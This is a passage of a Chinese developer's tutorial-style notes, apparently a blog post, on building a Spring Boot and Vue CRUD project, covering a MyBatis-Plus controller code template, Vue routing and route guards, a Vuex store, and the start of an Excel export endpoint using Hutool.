punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>#<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>stereotype<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Controller</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>#end</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>#<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>superControllerClassPackage<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> $<span class=\"token punctuation\">&#123;</span>superControllerClassPackage<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>#end</pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"23\"></td><td><pre> * &lt;p></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> * $!&#123;table.comment&#125; 前端控制器</pre></td></tr><tr><td data-num=\"25\"></td><td><pre> * &lt;/p></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"27\"></td><td><pre> * @author $&#123;author&#125;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre> * @since $&#123;date&#125;</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>#<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>restControllerStyle<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>#<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>#end</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#if($&#123;package.ModuleName&#125;)/$&#123;package.ModuleName&#125;#end/#if($&#123;controllerMappingHyphenStyle&#125;)$&#123;controllerMappingHyphen&#125;#else$&#123;table.entityPath&#125;#end\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>#<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>kotlin<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">class</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>controllerName<span class=\"token punctuation\">&#125;</span>#<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>superControllerClass<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> $<span class=\"token punctuation\">&#123;</span>superControllerClass<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>#end</pre></td></tr><tr><td data-num=\"38\"></td><td><pre> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>#<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    #<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>superControllerClass<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>controllerName<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">extends</span> $<span class=\"token punctuation\">&#123;</span>superControllerClass<span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    #<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>controllerName<span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    #end</pre></td></tr><tr><td data-num=\"45\"></td><td><pre> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token annotation punctuation\">@Resource</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">private</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>serviceName<span class=\"token punctuation\">&#125;</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\">// 新增或者更新</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostMapping</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestBody</span> $<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">saveOrUpdate</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token annotation punctuation\">@DeleteMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/&#123;id&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Boolean</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@PathVariable</span> <span class=\"token class-name\">Integer</span> id<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">removeById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre> </pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/del/batch\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">deleteBatch</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestBody</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span> ids<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">removeByIds</span><span class=\"token punctuation\">(</span>ids<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token operator\">&lt;</span>$<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">></span> <span class=\"token function\">findAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre> </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/&#123;id&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">public</span> $<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span> <span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@PathVariable</span> <span class=\"token class-name\">Integer</span> id<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre> </pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/page\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Page</span><span class=\"token operator\">&lt;</span>$<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">></span> <span class=\"token function\">findPage</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span> <span class=\"token class-name\">Integer</span> pageNum<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                            <span class=\"token annotation punctuation\">@RequestParam</span> <span class=\"token class-name\">Integer</span> pageSize<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token class-name\">QueryWrapper</span><span class=\"token operator\">&lt;</span>$<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">></span> queryWrapper <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">QueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            queryWrapper<span class=\"token punctuation\">.</span><span class=\"token function\">orderByDesc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>            <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>entityPath<span class=\"token punctuation\">&#125;</span><span class=\"token class-name\">Service</span><span class=\"token punctuation\">.</span><span class=\"token function\">page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Page</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>pageNum<span class=\"token punctuation\">,</span> pageSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> queryWrapper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre> </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre> </pre></td></tr><tr><td data-num=\"85\"></td><td><pre>#end</pre></td></tr></table></figure><p>配置好，再运行一次 CodeGenerator.java，nice！！！</p>\n<p>controller 彻底规范按模板生成了，泪目。</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118204011133.png\" alt=\"image-20240118204011133\" /></p>\n<p>之前的 user.xml 和 UserService.java 都可以删了</p>\n<p>注：官方默认配置也可以找到相关内容</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118202452009.png\" alt=\"image-20240118202452009\" /></p>\n<p>到这里，pom 中依赖全乱了，项目报错无法解决运行，于是乎重新构建了一个依赖分类清晰的项目，一直到引入代码生成模板相关的一个依赖后，<strong>@Resource</strong> 出现了报错</p>\n<p><strong>解决问题 18</strong></p>\n<p>重启 springboot 和 vue，能成功运行，实现 CRUD</p>\n<h1 id=\"vue使用路由\"><a class=\"anchor\" href=\"#vue使用路由\">#</a> Vue 使用路由</h1>\n<p>在 src/router/<strong>index.js 配置路由</strong></p>\n<p>Home.vue 改为 Manage.vue</p>\n<p>将之前的 el 代码分模块封装为组件，导入 component.js，进行<strong>全局注册</strong></p>\n<p>config.js 设置默认全局变量</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDA0MDUzMTU4OA==\">https://segmentfault.com/a/1190000040531588</span></p>\n<p>组件之间通过 porps 动态绑定数据</p>\n<p>接下来就是代码的重构，全部重构为组件式开发</p>\n<p>&lt;router-view /&gt; 作为 el-main 标签内的主页面，控制不同的路由，这里先开发 user 路由</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119170623925.png\" alt=\"image-20240119170623925\" /></p>\n<p>之后就是配置不同的路由开发不同的页面，以及不同组件之间数据的传递</p>\n<h2 id=\"路由守卫\"><a class=\"anchor\" href=\"#路由守卫\">#</a> 路由守卫</h2>\n<p>获取动态数据</p>\n<p>配置好主页 / 用户管理的路由信息</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119211208458.png\" alt=\"image-20240119211208458\" /></p>\n<p>watch 监听路由</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119211237416.png\" alt=\"image-20240119211237416\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119211247205.png\" alt=\"image-20240119211247205\" /></p>\n<p>index.js</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119211352799.png\" alt=\"image-20240119211352799\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119211400629.png\" alt=\"image-20240119211400629\" /></p>\n<h2 id=\"vuex\"><a class=\"anchor\" href=\"#vuex\">#</a> vuex</h2>\n<p>但是此时出现了新问题，手动输入 URL 时不会动态展示，这里用到<strong> vuex</strong></p>\n<p><strong>安装</strong></p>\n<pre><code>npm install vuex@3 --force\n</code></pre>\n<p>新建 src/<strong>store/index.js</strong></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> Vue <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> Vuex <span class=\"token keyword\">from</span> <span class=\"token string\">\"vuex\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Vue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>Vuex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> store <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuex<span class=\"token punctuation\">.</span>Store</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token literal-property property\">state</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token literal-property property\">currentPathName</span><span class=\"token operator\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token literal-property property\">mutations</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">setPath</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">state</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            state<span class=\"token punctuation\">.</span>currentPathName <span class=\"token operator\">=</span> localStorage<span class=\"token punctuation\">.</span><span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"currentPathName\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> store</pre></td></tr></table></figure><p>main.js 引入</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119212343184.png\" alt=\"image-20240119212343184\" /></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> Vue <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> Vuex <span class=\"token keyword\">from</span> <span class=\"token string\">\"vuex\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Vue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>Vuex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> store <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuex<span class=\"token punctuation\">.</span>Store</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token literal-property property\">state</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token literal-property property\">currentPathName</span><span class=\"token operator\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token literal-property property\">mutations</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">setPath</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">state</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            state<span class=\"token punctuation\">.</span>currentPathName <span class=\"token operator\">=</span> localStorage<span class=\"token punctuation\">.</span><span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"currentPathName\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> store</pre></td></tr></table></figure><p><strong>router/index.js</strong> 继续配置路由守卫</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">beforeEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">to<span class=\"token punctuation\">,</span> from<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  localStorage<span class=\"token punctuation\">.</span><span class=\"token function\">setItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"currentPathName\"</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 设置当前路由名称，为了在 Header 组件中使用</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  store<span class=\"token punctuation\">.</span><span class=\"token function\">commit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setPath\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 触发 store 的数据更新</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 放行路由</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里<strong>解决问题 21</strong>，这里并不属于解决方法的四种之一，是因为 index.js 中包没有导入</p>\n<h1 id=\"导入导出\"><a class=\"anchor\" href=\"#导入导出\">#</a> 导入导出</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odXRvb2wuY24vZG9jcy9pbmRleC5odG1sIy8=\">入门和安装 (hutool.cn)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odXRvb2xraXQuY29tL3poL2RvY3MvcG9pL2V4Y2VsJUU3JTk0JTlGJUU2JTg4JTkwLWV4Y2Vsd3JpdGVyLw==\">Excel 生成 - ExcelWriter – HutoolKit</span></p>\n<p>糊涂工具类依赖导入</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>cn.hutool<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>hutool-all<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>5.8.16<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.apache.poi<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>poi-ooxml<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>4.1.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"导出\"><a class=\"anchor\" href=\"#导出\">#</a> 导出</h2>\n<p>在 UserController 中写导出接口</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * 导出接口</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/export\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">export</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token 